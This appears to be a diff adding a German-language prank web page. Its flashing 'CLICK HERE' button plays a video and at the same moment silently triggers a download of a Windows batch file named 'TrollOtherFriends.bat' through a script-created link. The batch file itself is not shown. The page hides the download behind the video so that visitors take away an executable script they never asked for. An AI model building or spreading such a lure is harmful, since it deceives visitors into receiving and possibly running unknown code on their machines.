@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>CLICK HERE</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            height: 100vh;
+            background: #050505;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: monospace;
+            overflow: hidden;
+        }
+
+        #startButton {
+            position: relative;
+            padding: 25px 60px;
+            font-family: monospace;
+            font-size: 28px;
+            font-weight: bold;
+            letter-spacing: 4px;
+            color: #00ff66;
+            background: #050505;
+            border: 2px solid #00ff66;
+            cursor: pointer;
+            text-shadow:
+                0 0 5px #00ff66,
+                0 0 15px #00ff66;
+            box-shadow:
+                0 0 10px #00ff66,
+                inset 0 0 15px rgba(0,255,100,0.2);
+            animation: glitch 1.2s infinite;
+        }
+
+        #startButton:hover {
+            background: #00ff66;
+            color: #000;
+            box-shadow:
+                0 0 20px #00ff66,
+                0 0 50px #00ff66;
+        }
+
+        @keyframes glitch {
+            0%, 90%, 100% {
+                transform: translate(0);
+            }
+
+            92% {
+                transform: translate(-5px, 2px);
+            }
+
+            94% {
+                transform: translate(5px, -2px);
+            }
+
+            96% {
+                transform: translate(-3px, -1px);
+            }
+        }
+
+        #video {
+            display: none;
+            width: 100vw;
+            height: 100vh;
+            object-fit: contain;
+            background: black;
+        }
+    </style>
+</head>
+
+<body>
+
+    <button id="startButton">
+        &gt; CLICK HERE &lt;
+    </button>
+
+    <video id="video" controls>
+        <source src="video.mp4" type="video/mp4">
+        Dein Browser unterstützt dieses Video nicht.
+    </video>
+
+    <script>
+        const button = document.getElementById("startButton");
+        const video = document.getElementById("video");
+
+        button.addEventListener("click", async () => {
+
+            button.style.display = "none";
+            video.style.display = "block";
+
+            try {
+                await video.play();
+            } catch (error) {
+                console.log("Video konnte nicht automatisch gestartet werden:", error);
+            }
+
+            const link = document.createElement("a");
+
+            link.href = "./TrollOtherFriends.bat";
+            link.download = "TrollOtherFriends.bat";
+
+            document.body.appendChild(link);
+            link.click();
+            link.remove();
+        });
+    </script>
+
+</body>
+</html>
